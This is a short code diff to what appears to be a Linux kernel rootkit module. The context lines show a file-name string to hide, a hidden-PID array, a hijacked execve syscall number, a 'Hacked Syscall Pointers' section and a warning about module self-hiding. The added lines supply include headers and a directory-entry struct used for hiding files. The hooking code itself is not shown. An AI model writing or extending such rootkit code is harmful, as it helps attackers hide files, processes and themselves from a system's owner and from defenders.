@@ -7,6 +7,9 @@
 #include <linux/slab.h>
 #include <linux/dirent.h>
 #include <linux/fs.h>
+#include <asm/fcntl.h> 
+#include <asm/errno.h> 
+#include <linux/types.h> 
 
 /* WARNING! If you insmod this module without commenting out the module hiding lines,
 you won't be able to rmmod it. Brick your system and no one will feel bad for you */
@@ -44,6 +47,13 @@ char *hide_file = "p07470p33l3r"; // Name of files/directories to hide from user
 char hidden_PIDs[50][5];
 int index = 0;
 int __NR_myexecve;
+
+struct linux_dirent {
+	unsigned long d_ino;     /* Inode number */
+	unsigned long d_off;     /* Offset to next linux_dirent */
+	unsigned short d_reclen;  /* Length of this linux_dirent */
+	char d_name[];  /* Filename (null-terminated) */
+};
 
 /* Hacked Syscall Pointers */
 
